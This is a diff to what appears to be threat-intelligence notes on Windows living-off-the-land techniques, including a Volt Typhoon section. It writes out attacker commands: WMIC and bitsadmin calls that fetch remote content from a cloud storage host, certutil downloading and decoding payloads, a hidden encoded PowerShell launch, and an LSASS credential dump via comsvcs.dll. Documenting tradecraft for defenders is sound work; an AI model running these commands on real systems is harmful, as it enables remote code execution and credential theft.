@@ -25,7 +25,8 @@ This is a somewhat older blog, but I love it because it includes some Windows Lo
 
 ```cmd
 Wmic.exe os get ved5hit39, 25hit8, numberofusers /format:"https://storage.googleapis.com/ultramaker/09/v.txt"
-
+```
+```cmd
 Wmic.exe os get QMUTSQPK, JUXKBVOK, LNFTZKMH, freephyscialmemory /format:"https://storage.googleapis.com/ultramaker/08/vv.txt" 
 ```
 
@@ -38,7 +39,8 @@ bitsadmin.exe /transfer msd5 /priority foreground https://storage.googleapis.com
 
 ```cmd
 certutil.exe -urlcache -f "<URL/Payload>" "%Temp%\demo.exe"
-
+```
+```cmd
 certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z %PUBLIC%\Libraries\temporary\falxconxrenwb.~
 ```
 
@@ -48,14 +50,17 @@ certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z %PUBLIC%\L
 
 ### [Volt Typhoon](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)
 
-1. wmi
+1. WMI
 2. LSASS Process dumping (LotL)
    - cmd.exe / powershell.exe
    - rundll32.exe
    - base64 encode 
 
 ```powershell
-cmd.exe /c powershell -exec bypass -W hidden -nop -E <Base64: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full>
+cmd.exe /c powershell -exec bypass -W hidden -nop -E <Base64>
+```
+```cmd
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> %Temp%\lsass.dmp full
 ```
 
 ![alt text](image-1.png)
